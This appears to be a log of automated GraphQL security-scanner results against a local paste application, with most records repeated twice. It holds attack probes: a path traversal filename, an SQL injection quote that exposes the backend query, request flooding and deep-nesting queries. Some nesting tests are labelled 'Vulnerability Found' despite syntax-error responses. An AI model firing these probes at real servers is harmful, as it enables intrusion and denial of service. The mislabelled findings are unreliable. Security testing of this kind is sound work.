{
    "Subscription Test": {
        "status": "Potential Data Leakage",
        "details": {
            "type": "Subscription",
            "field": "paste",
            "query": "subscription { paste { id } }",
            "status_code": 200
        },
        "query": "subscription { paste { id } }",
        "response": {
            "errors": [
                {
                    "message": "Subscription must return Async Iterable or Observable. Received: <Promise at 0x7f945c7643d0 fulfilled with <rx.core.anonymousobservable.AnonymousObservable object at 0x7f945b2f5450>>"
                }
            ],
            "data": null
        }
    }
}
{
    "Path Traversal Test on uploadPaste": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Path Traversal",
            "severity": "High",
            "description": "Test to identify if file operations allow navigation to parent directories, potentially accessing unauthorized files."
        },
        "query": "\n                mutation {\n                    uploadPaste(filename:\"../../../../../tmp/file.txt\", content:\"test\") {\n                        result\n                    }\n                }\n                ",
        "response": {
            "data": {
                "uploadPaste": {
                    "result": "test"
                }
            }
        }
    }
}
{
    "DoS Attack": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Denial of Service (DoS)",
            "severity": "High",
            "description": "This test floods the server with repeated requests to check if the server can handle high load without service degradation or crash.",
            "remediation": "Implement rate limiting, use a robust load balancer, and consider auto-scaling."
        },
        "query": "query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }",
        "response": {
            "400": 100
        }
    }
}
{
    "Deep Recursion Test on Query": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  {  readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:250) Expected Name, found }\n\n1: query { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  {  readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                            ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 250
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on PasteObject": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  {  owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:160) Expected Name, found }\n\n1: query { owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  {  owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                  ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 160
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on Mutations": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  {  editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:290) Expected Name, found }\n\n1: query { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  {  editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                    ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 290
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on Mutations": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  {  uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:310) Expected Name, found }\n\n1: query { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  {  uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                                        ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 310
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on Mutations": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  {  createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:300) Expected Name, found }\n\n1: query { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  {  createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                              ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 300
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on CreatePaste": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  {  paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:190) Expected Name, found }\n\n1: query { paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  {  paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 190
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on CreateUser": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  {  user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:180) Expected Name, found }\n\n1: query { user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  {  user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                      ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 180
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on __Schema": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  {  mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:260) Expected Name, found }\n\n1: query { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  {  mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                      ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 260
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on __Type": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  {  ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:310) Expected Name, found }\n\n1: query { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  {  ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                                        ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 310
                        }
                    ]
                }
            ]
        }
    }
}
{
    "SQL Injection Test on 'pastes' field": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "SQL Injection",
            "severity": "High",
            "description": "Attempts to exploit SQL injection vulnerabilities by injecting malicious SQL code through GraphQL queries.",
            "remediation": "Use parameterized queries or prepared statements to handle user input."
        },
        "query": "\n        query {\n            pastes(filter: \"one two three'\") {\n                title\n                content\n                public\n            }\n        }\n        ",
        "response": {
            "errors": [
                {
                    "message": "(sqlite3.OperationalError) near \"one\": syntax error\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = 'one two three'' or content = 'one two three'' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"
                }
            ],
            "data": {
                "pastes": null
            }
        }
    }
}
{
    "Get Users Test": {
        "status": "Test Not Applicable",
        "details": {
            "description": "Tests if user data for administrators can be fetched without proper authorization.",
            "severity": "High"
        },
        "query": "\n        query getUsers {\n          users(where: {role: ADMINISTRATOR}) {\n            edges {\n              node {\n                userId\n                name\n              }\n            }\n          }\n        }\n        ",
        "response": "400 Client Error: BAD REQUEST for url: http://localhost:5013/graphql"
    }
}
{
    "Batching Attack Test": {
        "status": "HTTP Error",
        "details": "Error response from server",
        "query": "[\"query { systemUpdate }\"]",
        "response": {
            "status": 500,
            "response": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
        }
    }
}
{
    "Subscription Test": {
        "status": "Potential Data Leakage",
        "details": {
            "type": "Subscription",
            "field": "paste",
            "query": "subscription { paste { id } }",
            "status_code": 200
        },
        "query": "subscription { paste { id } }",
        "response": {
            "errors": [
                {
                    "message": "Subscription must return Async Iterable or Observable. Received: <Promise at 0x7f945ce41250 fulfilled with <rx.core.anonymousobservable.AnonymousObservable object at 0x7f945c776990>>"
                }
            ],
            "data": null
        }
    }
}
{
    "Path Traversal Test on uploadPaste": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Path Traversal",
            "severity": "High",
            "description": "Test to identify if file operations allow navigation to parent directories, potentially accessing unauthorized files."
        },
        "query": "\n                mutation {\n                    uploadPaste(filename:\"../../../../../tmp/file.txt\", content:\"test\") {\n                        result\n                    }\n                }\n                ",
        "response": {
            "data": {
                "uploadPaste": {
                    "result": "test"
                }
            }
        }
    }
}
{
    "DoS Attack": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Denial of Service (DoS)",
            "severity": "High",
            "description": "This test floods the server with repeated requests to check if the server can handle high load without service degradation or crash.",
            "remediation": "Implement rate limiting, use a robust load balancer, and consider auto-scaling."
        },
        "query": "query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }",
        "response": {
            "400": 100
        }
    }
}
{
    "Deep Recursion Test on Query": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  {  readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:250) Expected Name, found }\n\n1: query { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  {  readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { readAndBurn  { paste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                            ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 250
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on PasteObject": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  {  owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:160) Expected Name, found }\n\n1: query { owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  {  owner  { me  { owner  { me  { owner  { me  { owner  { me  { owner  { me  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                  ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 160
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on Mutations": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  {  editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:290) Expected Name, found }\n\n1: query { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  {  editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { editPaste  { createPaste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                    ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 290
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on Mutations": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  {  uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:310) Expected Name, found }\n\n1: query { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  {  uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { uploadPaste  { deletePaste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                                        ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 310
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on Mutations": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  {  createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:300) Expected Name, found }\n\n1: query { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  {  createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { createUser  { importPaste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                              ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 300
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on CreatePaste": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  {  paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:190) Expected Name, found }\n\n1: query { paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  {  paste  { login  { paste  { login  { paste  { login  { paste  { login  { paste  { login  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 190
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on CreateUser": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  {  user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:180) Expected Name, found }\n\n1: query { user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  {  user  { paste  { user  { paste  { user  { paste  { user  { paste  { user  { paste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                      ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 180
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on __Schema": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  {  mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:260) Expected Name, found }\n\n1: query { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  {  mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { mutationType  { paste  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                      ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 260
                        }
                    ]
                }
            ]
        }
    }
}
{
    "Deep Recursion Test on __Type": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Deep Recursion Query",
            "severity": "Medium",
            "description": "Tests server's ability to handle deeply nested and interconnected queries.",
            "remediation": "Implement depth limiting on GraphQL queries."
        },
        "query": "query { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  {  ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { } } } } } } } } } } } } } } } } } } } } }",
        "response": {
            "errors": [
                {
                    "message": "Syntax Error GraphQL (1:310) Expected Name, found }\n\n1: query { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  {  ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { ofType  { subscriptionType  { } } } } } } } } } } } } } } } } } } } } }\n                                                                                                                                                                                                                                                                                                                        ^\n",
                    "locations": [
                        {
                            "line": 1,
                            "column": 310
                        }
                    ]
                }
            ]
        }
    }
}
{
    "SQL Injection Test on 'pastes' field": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "SQL Injection",
            "severity": "High",
            "description": "Attempts to exploit SQL injection vulnerabilities by injecting malicious SQL code through GraphQL queries.",
            "remediation": "Use parameterized queries or prepared statements to handle user input."
        },
        "query": "\n        query {\n            pastes(filter: \"one two three'\") {\n                title\n                content\n                public\n            }\n        }\n        ",
        "response": {
            "errors": [
                {
                    "message": "(sqlite3.OperationalError) near \"one\": syntax error\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = 'one two three'' or content = 'one two three'' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"
                }
            ],
            "data": {
                "pastes": null
            }
        }
    }
}
{
    "Get Users Test": {
        "status": "Test Not Applicable",
        "details": {
            "description": "Tests if user data for administrators can be fetched without proper authorization.",
            "severity": "High"
        },
        "query": "\n        query getUsers {\n          users(where: {role: ADMINISTRATOR}) {\n            edges {\n              node {\n                userId\n                name\n              }\n            }\n          }\n        }\n        ",
        "response": "400 Client Error: BAD REQUEST for url: http://localhost:5013/graphql"
    }
}
{
    "Batching Attack Test": {
        "status": "HTTP Error",
        "details": "Error response from server",
        "query": "[\"query { systemUpdate }\"]",
        "response": {
            "status": 500,
            "response": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
        }
    }
}
{
    "Alias-Based Attack": {
        "status": "No Vulnerability Found",
        "details": {
            "vulnerability": "Alias-Based Attack",
            "severity": "Medium",
            "description": "Tests if the server handles numerous query aliases without significant performance drop or errors.",
            "remediation": "Limit the number of allowed aliases in queries to prevent abuse."
        },
        "query": "{q0: systemUpdate}",
        "response": {
            "status_codes": [
                200
            ],
            "sample_responses": [
                {
                    "data": {
                        "q0": "no updates available"
                    }
                }
            ]
        }
    }
}
